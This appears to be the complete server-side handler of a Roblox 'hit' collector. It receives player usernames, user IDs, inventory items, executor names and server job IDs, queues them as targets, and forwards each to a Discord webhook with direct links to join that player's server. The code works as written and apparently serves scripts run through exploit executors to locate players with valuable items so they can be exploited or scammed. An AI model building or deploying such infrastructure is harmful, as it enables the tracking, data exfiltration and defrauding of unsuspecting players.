let targetQueue = [];

module.exports = async (req, res) => {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        const body = req.body || {};
        if (body.jobId) {
            const exists = targetQueue.some(t => t.jobId === body.jobId && t.username === body.username);
            if (!exists) {
                targetQueue.push({
                    username: body.username || "Unknown",
                    jobId: body.jobId,
                    item: body.item || "No Items / Unknown",
                    timestamp: new Date().toISOString()
                });

                const webhookUrl = process.env.DISCORD_WEBHOOK;
                if (webhookUrl) {
                    try {
                        const hitData = body.hitData || {};
                        const placeId = hitData.placeId || "142823291";
                        const joinLink = `https://www.roblox.com/games/start?placeId=${placeId}&launchData=${body.jobId}`;
                        const protocolLink = `roblox://experiences/start?placeId=${placeId}&gameInstanceId=${body.jobId}`;

                        const embed = {
                            title: "🎯 New User!",
                            color: 65280,
                            thumbnail: {
                                url: hitData.avatarUrl || ""
                            },
                            fields: [
                                { name: "👤 Username", value: body.username || "Unknown", inline: true },
                                { name: "🆔 User ID", value: String(hitData.robloxUserId || "Unknown"), inline: true },
                                { name: "🛠️ Executor", value: hitData.executor || "Unknown", inline: true },
                                { name: "🎒 Inventory", value: body.item && body.item !== "" ? body.item : "None", inline: false },
                                { name: "🔗 Join Server", value: `[🟢 Join Server (Web)](${joinLink}) | [⚡ Protokol](${protocolLink})`, inline: false },
                                { name: "📱 Mobile Copy JobId", value: "`" + body.jobId + "`", inline: false },
                                { name: "💻 PC Copy JobId", value: "```" + body.jobId + "```", inline: false }
                            ],
                            footer: {
                                text: `JobId: ${body.jobId}`
                            }
                        };

                        await fetch(webhookUrl, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ embeds: [embed] })
                        });
                    } catch (err) {
                        console.error("Webhook gönderme hatası:", err);
                    }
                }
            }
        }
        return res.status(200).json({ success: true, queueLength: targetQueue.length });
    }

    if (req.method === 'GET') {
        const currentTarget = targetQueue.length > 0 ? targetQueue[0] : null;
        return res.status(200).json({ current: currentTarget, queue: targetQueue });
    }

    if (req.method === 'DELETE') {
        if (targetQueue.length > 0) {
            targetQueue.shift();
        }
        return res.status(200).json({ success: true, remaining: targetQueue.length });
    }

    res.status(405).json({ error: 'Method not allowed' });
};
